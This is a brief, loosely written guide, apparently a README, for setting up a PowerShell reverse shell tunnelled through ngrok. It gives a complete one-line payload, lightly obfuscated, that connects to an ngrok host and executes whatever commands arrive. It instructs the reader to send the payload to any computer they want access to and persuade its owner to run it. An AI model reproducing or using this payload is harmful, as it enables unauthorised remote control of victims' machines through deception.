install and setup chocolately on your pc 
Run this python code first (server.py)
then open cmd and write tcp install chocolately you will get a 5 digit code
put that code in this pay load 
$client = New-O'b'ject System.Net.Sockets.TCPClient('0.tcp.in.ngrok.io',**YOUR_CODE**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
then send this to any other computer you want to get access of 
ask him to run that payload on powershell
after that check output of server.py
